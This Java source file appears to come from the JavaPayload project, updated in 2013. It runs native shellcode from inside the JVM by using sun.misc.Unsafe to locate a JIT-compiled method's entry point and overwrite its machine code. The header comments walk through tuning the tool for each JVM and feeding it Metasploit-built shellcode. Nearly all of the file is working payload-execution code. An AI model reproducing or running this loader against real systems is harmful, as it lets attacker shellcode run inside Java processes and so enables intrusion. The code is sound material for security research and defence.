package shellcoderunner;	

/*
 * Running shellcode from Java without JNI (i. e. loading a DLL from disk).
 * Second attempt, this time trying to overwrite a JITed method.
 * (c) 2011 Michael Schierl <schierlm at gmx dot de> (Twitter @mihi42)
 * https://github.com/schierlm/JavaPayload
 *
 * - 6/24/2013 Ryan Wincey
 * 
 * Updated to expand supported JVMs.  Added a bruteforcer for finding the
 * offset of the correct method object in Java 7.  Updated the method array slot code for
 * Java 7 offsets.  Updated the native method check code.  Added a fixup for Java 7 
 * in the section that searches for the native method pointer as some shifting was necessary.  
 * Refactored the parameter parsing functions.  
 * 
 * Added the following back from a previous version to allow others to extend like I did.
 * Some of it isn't appropriate but it has alot of good info.  Thank Michael :)
 * 
 *  How to test other versions:
 *
 * 1. Compile this class with settings supported by your target JVM (and
 *    -target 1.1) and run it without arguments. It will examine the class fields
 *    for candidates that might hold a pointer to the method array. The method
 *    array is a Java array that contains one entry for each method, and this
 *    entry contains a native pointer to its entry point (for native methods).
 *    Therefore we first have to find the offset of this pointer. First filter
 *    out all values that are most likely not pointers (too small, too "round",
 *    etc.) In case you have a debugger handy, look at the remaining candidates.
 *    A method array will start with jvm flags (usually 0x00000001), a pointer
 *    to the array's element class object, its length (which should be equal to
 *    the number printed above the candidate table), and a pointer to each of the
 *    elements. The rest (up to an architecture-dependent size) is padded with
 *    zeros. If you don't have a debugger handy, just try all of the candidates
 *    in the next step until you get success.
 *    
 *    [Note: On Win32, the slots before the pointer are filled with 0,0,0(,0,1,0,0).]
 *    
 * 2. Run the class with the (suspected) correct method array slot number as its
 *    (only) argument. If the slot was wrong, the JVM will most likely print an
 *    obscure error message or crash. If the slot was correct, it will dump the
 *    fields of the method object inside the array, once before running the method
 *    and once after running the method 1000 times. One of these fields is pointer
 *    to the NMETHOD struct of the function (which contains information about JITted
 *    methods) - which is only filled after the method has been JITted (in case no
 *    field changed, try to run with -Xint to avoid JIT and compare the results).
 *    Examine the pointers until you found this slot, or again just use trial and
 *    error in the next step.
 *    
 *    [Note: On Win32, this is 2 slots before the native method slot of
 *    ShellcodeTest.java.]
 *    
 * 3. Run the class with two parameters, first the method array slot number from
 *    step one, then the NMethod slot number from step two. It will print the
 *    members of that struct, and you have to pick the entry point. For static
 *    methods, the entry point usually occurs three times (_entry_point,
 *    _verified_entry_point, _osr_entry_point), it does not matter which one you
 *    pick. Use this value as the 3rd parameter. The first three parameters have
 *    to be kept for all the following steps, there are only parameters to be
 *    added.
 *    
 *    [Note: On Win32, the value is only slightly higher than the
 *    NMethod pointer value]
 *    
 
 * 4. Run the class with "raw C3" as the 4th and 5th parameter (if your architecture
 *    uses a different opcode for RET, replace it, e. g. "raw DE AD BE EF". This code
 *    will be written into a freshly allocated memory region and the region's base
 *    address will be used for the pointer. This time, the program should not crash,
 *    but return, and print a success message as last step. Running it with
 *    "threaded raw C3" should result in the same results.
 *    
 * 5. Use Metasploit or similar to build a native shellcode for your platform,
 *    using EXITFUNC = thread (or similar) - EXITFUNC = RET would be better. Now run
 *    the class with "file /path/to/your/shellcode" as 4th and 5th parameter, which
 *    should result in execution of your shellcode, but probably a crash afterwards.
 *    Try again with "threaded file /path/to/your/shellcode". On Windows, both variants
 *    run the shellcode, but crash/hang afterwards, therefore the "Not Supported" in the
 *    last column of the table. [The unthreaded approach kills the Java process on exit,
 *    the threaded approach hangs forever.]
 *    
 * 6. Fill in the table above and send it to me :-)
 *
 * 
 */

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import sun.misc.Unsafe;
     
public class ShellcodeRunner {
    
    private static Object methodObject;
    public Object obj1, obj2; // for detecting compressed pointers
    //===========================================================================
    /**
     * 
     * @param args
     * @throws Exception 
     */
    public static void main(String[] args) throws Exception {

        int offsetArg = -1;
        String payloadStr;
        File shellCodeFile;
        byte[] shellcode = new byte[0];
        StringBuilder aSB = new StringBuilder();

        if( args.length == 0){
            System.out.println("[-] ERROR: Please input the correct parameters!");
            System.out.println("[-] Usage: raw=<\"\\x34\\x23\" format> or file=<Shellcode File Path>");
            return;
        } else {

            //Get the args
            String arg1 = args[0];
            String[] theArgArr = arg1.split("=");
            if( theArgArr.length == 2){

                String ident = theArgArr[0].trim();
                String val = theArgArr[1].trim();
                if( ident.equals("raw")){

                    payloadStr = val;
                    int beforeSplit = payloadStr.length();
                    ByteBuffer aBB = ByteBuffer.allocate( beforeSplit/2);

                    String[] byteStrArr = payloadStr.split("\\\\x");
                    for( String aByteStr : byteStrArr ){
                        if( !aByteStr.isEmpty()){
                            byte aByte = (byte) Integer.parseInt( aByteStr, 16);
                            aBB.put( aByte );
                        }
                    }

                    shellcode = Arrays.copyOf( aBB.array(), aBB.position());

                } else if( ident.equals("offset")){
                    offsetArg = Integer.parseInt( val ); 
                } else if( ident.equals("file")){

                    //Make sure the file exists
                    shellCodeFile = new File( val );
                    if( !shellCodeFile.exists()){
                        System.out.println("[-] The payload file does not exist.");  
                    }

                    if (shellCodeFile.length() > 5120) {
                        System.out.println("[-] File too large, " + shellCodeFile.length() + " > 5120");
                        return;
                    }

                    shellcode = new byte[(int) shellCodeFile.length()];
                    DataInputStream dis = new DataInputStream(new FileInputStream(shellCodeFile));
                    dis.readFully(shellcode);
                    dis.close();

                    //Set the shellcode length
                } else {
                     System.out.println("[-] ERROR: Please input the correct parameters!");
                     System.out.println("[-] Usage: raw=<\"\\x34\\x23\" format> or file=<Shellcode File Path>");
                     return;
                }

            } else {
                System.out.println("[-] ERROR: Please input the correct parameters!");
                System.out.println("[-] Usage: raw=<\"\\x34\\x23\" format> or file=<Shellcode File Path>");
                return;
            }
        }
        
        // avoid Unsafe.class literal here since it may introduce
        // a synthetic method and disrupt our calculations.
        java.lang.reflect.Field unsafeField = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) unsafeField.get(null);
        long addressSize = unsafe.addressSize();
        Class thisClass = ShellcodeRunner.class;

        //Check for compressed pointers
        boolean compressedPointers = false;
        if (addressSize == 8) {
            Field fld1 = thisClass.getDeclaredField("obj1");
            Field fld2 = thisClass.getDeclaredField("obj2");
            long distance = Math.abs(unsafe.objectFieldOffset(fld1) - unsafe.objectFieldOffset(fld2));
            compressedPointers = (distance == 4);
        }

        final int METHOD_COUNT = thisClass.getDeclaredMethods().length + 1;
        Field staticField = thisClass.getDeclaredField("methodObject");
        Object staticFieldBase = unsafe.staticFieldBase(staticField);
        Object methodArrayBase = staticFieldBase;

        long [] values = new long[80];
        
        //Look at the memory values
//        printMemoryValues( addressSize, unsafe, methodArrayBase, values.length * addressSize);

        //Get the field
        Field methodSlotField = Class.forName("java.lang.reflect.Method").getDeclaredField("slot");
        methodSlotField.setAccessible(true);
        int shellcodeMethodSlot = ((Integer) methodSlotField.get(thisClass.getDeclaredMethod("jitme", new Class[0]))).intValue();

        int methodArraySlot = -1;
        if ( offsetArg == -1) {

            //Find the method object
            findBaseObject( unsafe, addressSize, methodArrayBase, compressedPointers, shellcodeMethodSlot );

        } else {

            //Get the slot to try
            long offset = offsetArg;
            methodArrayBase = unsafe.getObject(methodArrayBase, offset);

            //Fill the values
            for (int i = 0; i < values.length; i++) {
                values[i] = addressSize == 8 ? unsafe.getLong(methodArrayBase, (long) (i * addressSize)) : unsafe.getInt(methodArrayBase, (long) (i * addressSize)) & 0xFFFFFFFFL;
            }

            //Get the slot
            //** Updated to only check for 1 zero instead of 2 because newer versions
            //of Java only have 1 zero.
            for (int i = 0; i < values.length - 5; i++) {
                if ( values[i + 1] == 0 && values[i + 2] > 100000 && values[i + 3] > 100000 && values[i + 4] > 100000 && values[i + 4] == values[i + 5]) {
                    methodArraySlot = i + 2;
                }
            }

            //Return error if not found
            if (methodArraySlot == -1) {
                System.err.println("[-] Method array slot not found.");
                return;
            }

            //Check for compressed pointers
            if (compressedPointers) {

                // method array looks like this:
                // flags 01 00 00 00 00 00 00 00
                // class xx xx xx xx (compressed)
                // length 05 00 00 00
                // elements (compressed each)
                long methodArrayAddr = unsafe.getLong(methodArrayBase, methodArraySlot * addressSize );
                int methodCount = unsafe.getInt(methodArrayAddr + 12);
                if (methodCount != METHOD_COUNT) {
                    System.err.println("[-] ERROR: Array length is " + methodCount + ", should be " + METHOD_COUNT);
                    return;
                }

                System.exit( (int) methodArraySlot );

            } else {

                Object methodArray = unsafe.getObject(methodArrayBase, methodArraySlot * addressSize);
                int methodCount = Array.getLength(methodArray);
                if (methodCount != METHOD_COUNT) {
                        System.err.println("[-] ERROR: Array length is " + methodCount + ", should be " + METHOD_COUNT);
                        return;
                }

                System.exit( (int) methodArraySlot);
            }

        }
        
        //Set the count
//        long maxOffset = addressSize * 35;
//        long[] oldval = new long[(int)(maxOffset/addressSize)];

        //Search for the native method pointer
        values = new long[35];
        int cnt = 100000;
        int nmethodSlot = -1;
        boolean found = false;
        while ( nmethodSlot == -1 && cnt < 1000000) {
            
            for (int i = 0; i < cnt; i++) {
                    jitme();
            }
            
            for (int i = 0; i < values.length; i++) {
//                oldval[i] = values[i];
                values[i] = addressSize == 8 ? unsafe.getLong(methodObject, (long) (i * addressSize)) : unsafe.getInt(methodObject, (long) (i * addressSize)) & 0xFFFFFFFFL;
//                System.out.println("\t" + i + "\t" + Long.toHexString(oldval[i]) + "\t" + Long.toHexString(values[i]));
            }
            
            nmethodSlot = -1;
            for (int j = 0; j < values.length - 8; j++) {

                //** Updated - Get the temp var to check
                //Necessary Fixup for 64bit JVM
                long numToCheck;
                if( addressSize == 8 ){
                    numToCheck = values[j] >>> 32;
                } else {
                    numToCheck = values[j];
                }

                //Check for 0xd as the least significant byte
                if (numToCheck % 8 == 5 && values[j + 1] == 13) {
                    nmethodSlot = j + 5;
                    if (values[j + 8] > 100000)
                            nmethodSlot = j + 7;
                    break;
                } else if (numToCheck % 8 == 5 && values[j + 1] == 5) {
                    nmethodSlot = j + 2;
                    if (values[j + 5] > 100000)
                            nmethodSlot = j + 4;
                    break;
                }
            }
            
            if (nmethodSlot > 0 && values[nmethodSlot] == 0)
                    nmethodSlot = -1;
            if (!found && nmethodSlot != -1) {
                // jit a bit more to avoid spurious errors
                found = true;
                nmethodSlot = -1;
            }
        
        }

        //Return if the native method slot wasn't found
        if (nmethodSlot == 0 || nmethodSlot == -1) {
            System.out.println("[-] NMETHOD pointer slot not found");
            for (int i = 0; i < values.length; i++) {
                System.out.println("\t"+i+"\t"+Long.toHexString(values[i]));
            }
            return;
        }        

        System.out.println("[*] Obtaining NMETHOD pointer (slot " + nmethodSlot + ")");
        long nmethodValue = addressSize == 8 ? unsafe.getLong(methodObject, nmethodSlot * addressSize) : unsafe.getInt(methodObject, nmethodSlot * addressSize) & 0xFFFFFFFFL;
        System.out.println("[+] Successfully obtained NMETHOD pointer");               

        //Try and find the entry point
        values = new long[40];
        for (int i = 0; i < values.length; i++) {
            values[i] = addressSize == 8 ? unsafe.getLong(nmethodValue + i * addressSize) : unsafe.getInt(nmethodValue + i * addressSize) & 0xFFFFFFFFL;
//            System.out.println("\t"+i+"\t"+Long.toHexString(values[i]));
        }
        int epOffset = -1;
        for (int i = 0; i < values.length - 3; i++) {
            if (values[i] > 10000 && values[i] == values[i + 1] && (values[i] == values[i + 2]) != (values[i] == values[i + 3])) {
                    epOffset = i;
                    break;
            }
        }

        //Print error message
        if (epOffset == -1) {
            System.out.println("[-] Entry point not found");
            for (int i = 0; i < values.length; i++) {
                    System.out.println("\t"+i+"\t"+Long.toHexString(values[i]));
            }
            return;
        }

        System.out.println("[*] Obtaining entry point pointer (offset " + epOffset + ")");
        final long targetAddress = addressSize == 8 ? unsafe.getLong(nmethodValue+epOffset * addressSize) : unsafe.getInt(nmethodValue+epOffset*addressSize) & 0xFFFFFFFFL;
        System.out.println("[+] Successfully obtained entry point pointer");           

        //Put the shellcode in the memory space for the java method
        long ptr = targetAddress;
        Thread.sleep(1000);
        for (int i = 0; i < shellcode.length; i++) {
            unsafe.putByte(ptr, shellcode[i]);
            ptr++;
        }

        System.out.println("[+] Successfully overwritten JIT method");
        System.out.println("[*] Executing native method (drum roll...)");
        executed = false;
        jitme();
        if (executed)
            System.out.println("[-] ERROR: Original method has been executed!");
        else
            System.out.println("[+] Executed native method and returned!");

    }

    private static volatile boolean executed;
    private static volatile int v1,v2,v3,v4,v5;

    //===========================================================================
    /**
     *  Java method that gets overwritten by shellcode
     *  The native method pointer is then overwritten with a pointer to this method
     */
    private static void jitme() {           
        executed = true;

        // On x86: each volatile inc/dec needs 18 bytes,
        // all 320 of them need 5760 bytes,
        // whole JIT method needs 5842 bytes.
        // if you need more shellcode, make a longer method
        v1++; v2++; v3++; v4++; v5++;
        v1++; v2++; v3++; v4++; v5--;
        v1++; v2++; v3++; v4--; v5++;
        v1++; v2++; v3++; v4--; v5--;
        v1++; v2++; v3--; v4++; v5++;
        v1++; v2++; v3--; v4++; v5--;
        v1++; v2++; v3--; v4--; v5++;
        v1++; v2++; v3--; v4--; v5--;
        v1++; v2--; v3++; v4++; v5++;
        v1++; v2--; v3++; v4++; v5--;
        v1++; v2--; v3++; v4--; v5++;
        v1++; v2--; v3++; v4--; v5--;
        v1++; v2--; v3--; v4++; v5++;
        v1++; v2--; v3--; v4++; v5--;
        v1++; v2--; v3--; v4--; v5++;
        v1++; v2--; v3--; v4--; v5--;
        executed = true;
        v1--; v2++; v3++; v4++; v5++;
        v1--; v2++; v3++; v4++; v5--;
        v1--; v2++; v3++; v4--; v5++;
        v1--; v2++; v3++; v4--; v5--;
        v1--; v2++; v3--; v4++; v5++;
        v1--; v2++; v3--; v4++; v5--;
        v1--; v2++; v3--; v4--; v5++;
        v1--; v2++; v3--; v4--; v5--;
        v1--; v2--; v3++; v4++; v5++;
        v1--; v2--; v3++; v4++; v5--;
        v1--; v2--; v3++; v4--; v5++;
        v1--; v2--; v3++; v4--; v5--;
        v1--; v2--; v3--; v4++; v5++;
        v1--; v2--; v3--; v4++; v5--;
        v1--; v2--; v3--; v4--; v5++;
        v1--; v2--; v3--; v4--; v5--;
        if (v1 + v2 + v3 + v4 + v5 != 0)
                throw new RuntimeException();
        v1++; v2++; v3++; v4++; v5++;
        v1++; v2++; v3++; v4++; v5--;
        v1++; v2++; v3++; v4--; v5++;
        v1++; v2++; v3++; v4--; v5--;
        v1++; v2++; v3--; v4++; v5++;
        v1++; v2++; v3--; v4++; v5--;
        v1++; v2++; v3--; v4--; v5++;
        v1++; v2++; v3--; v4--; v5--;
        v1++; v2--; v3++; v4++; v5++;
        v1++; v2--; v3++; v4++; v5--;
        v1++; v2--; v3++; v4--; v5++;
        v1++; v2--; v3++; v4--; v5--;
        v1++; v2--; v3--; v4++; v5++;
        v1++; v2--; v3--; v4++; v5--;
        v1++; v2--; v3--; v4--; v5++;
        v1++; v2--; v3--; v4--; v5--;
        executed = true;
        v1--; v2++; v3++; v4++; v5++;
        v1--; v2++; v3++; v4++; v5--;
        v1--; v2++; v3++; v4--; v5++;
        v1--; v2++; v3++; v4--; v5--;
        v1--; v2++; v3--; v4++; v5++;
        v1--; v2++; v3--; v4++; v5--;
        v1--; v2++; v3--; v4--; v5++;
        v1--; v2++; v3--; v4--; v5--;
        v1--; v2--; v3++; v4++; v5++;
        v1--; v2--; v3++; v4++; v5--;
        v1--; v2--; v3++; v4--; v5++;
        v1--; v2--; v3++; v4--; v5--;
        v1--; v2--; v3--; v4++; v5++;
        v1--; v2--; v3--; v4++; v5--;
        v1--; v2--; v3--; v4--; v5++;
        v1--; v2--; v3--; v4--; v5--;
        executed = true;
    }

    //===================================================================
    /**
     *  Attempts to find the "method" object.
     * 
     * @return 
     */
    private static int findBaseObject( Unsafe unsafe, long addressSize, 
            Object methodArrayBase, boolean compressedPointers, int shellcodeMethodSlot ) throws Exception {

        long[] values = new long[80];
        long maxOffset = addressSize * values.length;
        List<String> stringList = new ArrayList<>();  

        Object staticFieldBase = methodArrayBase;
        String javaVersion = System.getProperty("java.version");
        int methodArraySlot = -1;
        if( javaVersion.contains("1.7")){
            
            Class shellcodeClass = ShellcodeRunner.class;
            URL ourUrl;
            File classPath = null;        
            try {

                try {
                    //Check if we are staging first
                    ourUrl = Class.forName("shellcoderunner.ShellcodeRunner").getProtectionDomain().getCodeSource().getLocation();
                } catch (ClassNotFoundException ex) {
                    ourUrl = ShellcodeRunner.class.getProtectionDomain().getCodeSource().getLocation();
                }

                //Check for null
                classPath = new File( ourUrl.toURI() );            

            } catch( URISyntaxException ex1) {
                ex1 = null;
            } catch( IllegalArgumentException ex ){
                ex = null;
            }
   
            File tmpDir;
            File shellcodeRunnerFile = null;
            if( classPath != null ){
                
                //If we are debugging it will be a directory
                if (classPath.isDirectory() ){
                
                    String str1 = shellcodeClass.getName().replace('.', '/') + ".class";

                    //Get the temp dir
                    File localFile2 = File.createTempFile("~pls", ".tmp");
                    localFile2.delete();
                    tmpDir = new File(localFile2.getAbsolutePath() + ".dir");
                    shellcodeRunnerFile = new File(tmpDir, str1);
                    shellcodeRunnerFile.getParentFile().mkdirs();

                    InputStream localInputStream = shellcodeClass.getResourceAsStream("/" + str1);
                    FileOutputStream localFileOutputStream = new FileOutputStream( shellcodeRunnerFile );
                    byte[] arrayOfByte = new byte[4096];

                    //Write the class to the tmp dir
                    int i;
                    while (( i = localInputStream.read(arrayOfByte)) != -1)
                        localFileOutputStream.write(arrayOfByte, 0, i);
                    localFileOutputStream.close();

                } else {

                    tmpDir = classPath;

                }

                System.out.println("[+] Running Java 1.7, rebasing method object.");      

                //Add the java path first
                String jrePath = JavaRunner.getJreExecutable("java");
                stringList.add(jrePath);
                stringList.add("-classpath");
                stringList.add( tmpDir.getAbsolutePath() );
                stringList.add( shellcodeClass.getName() );

                for (long offset = 4; offset < maxOffset; offset += 4) {

                    long value = unsafe.getInt(methodArrayBase, offset) & 0xFFFFFFFFL;
                    String strVal = Long.toHexString(value);
                    if( strVal.length() > 6 ){

                        //Run a separate thread for each
                        stringList.add( "offset=" + Long.toString( offset ) );
                        JavaRunner aRunner = new JavaRunner( stringList.toArray( new String[stringList.size()] ) );
                        aRunner.run();

                        //Get stdout
                        String StdOut = aRunner.getStdOut();

                        //Get stderr
                        String StdErr = aRunner.getStdErr();

                        //See if it is the one
                        int tempInt = aRunner.getExitValue();                       
                        if( StdOut.isEmpty() && StdErr.isEmpty() && tempInt != -1 ){ 

                            //Set the value
                            methodArrayBase = unsafe.getObject(methodArrayBase, offset );

                            //Get the method object
                            System.out.println("[+] Successfully obtained method object (offset " + offset + ")");                   

                            methodArraySlot = tempInt;
                            break;
                        }                

                        //Remove the last entry
                        stringList.remove( stringList.size() - 1);

                    }

                }

                //Delete the files
                if(classPath.isDirectory() && shellcodeRunnerFile != null ){
                    shellcodeRunnerFile.delete();
                    shellcodeRunnerFile.getParentFile().delete();
                    tmpDir.delete();
                }

                //If the slot wasn't received
                if( methodArraySlot == -1){
                    throw new Exception("[-] Method array slot not found.");
                }
            }

        } else {

             //Fill the values
            for (int i = 0; i < values.length; i++) {
                values[i] = addressSize == 8 ? unsafe.getLong(methodArrayBase, (long) (i * addressSize)) : unsafe.getInt(methodArrayBase, (long) (i * addressSize)) & 0xFFFFFFFFL;
            }

            //Get the slot
            for (int i = 0; i < values.length - 5; i++) {
                if ( values[i + 1] == 0 && values[i + 2] > 100000 && values[i + 3] > 100000 && values[i + 4] > 100000 && values[i + 4] == values[i + 5]) {
                    methodArraySlot = i + 2;
                }
            }

            //Return error if not found
            if (methodArraySlot == -1) {
                System.err.println("[-] Method array slot not found.");
                throw new Exception("[-] Method array slot not found.");
            }

        }

        if (compressedPointers) {

            //Add the right offset
            Class thisClass = Class.forName("shellcoderunner.ShellcodeRunner");
            long methodArrayAddr = unsafe.getLong(methodArrayBase, methodArraySlot * addressSize );
            int compressedMethodObjectPointer = unsafe.getInt(methodArrayAddr + 16 + shellcodeMethodSlot * 4);
            unsafe.putInt(staticFieldBase, unsafe.staticFieldOffset(thisClass.getDeclaredField("methodObject")), compressedMethodObjectPointer);

        } else {

            //Nothing special
            Object methodArray = unsafe.getObject(methodArrayBase, methodArraySlot * addressSize);
            methodObject = Array.get(methodArray, shellcodeMethodSlot);

        }                

        return -1;

    }          
    
     
//    //===========================================================================
//    /**
//     *  Helper method for printing out memory contents.
//     * 
//     * @param addressSize
//     * @param unsafe
//     * @param object
//     * @param maxOffset 
//    */
//    private static void printMemoryValues( long addressSize, Unsafe unsafe, Object object, long maxOffset) {
//        for (long offset = 0; offset < maxOffset; offset += addressSize) {
//            long value = addressSize == 8 ? unsafe.getLong(object, offset) : unsafe.getInt(object, offset) & 0xFFFFFFFFL;
//            System.out.println("\t" + offset / addressSize + "\t" + Long.toHexString(value));
//        }
//    }

    
            
}
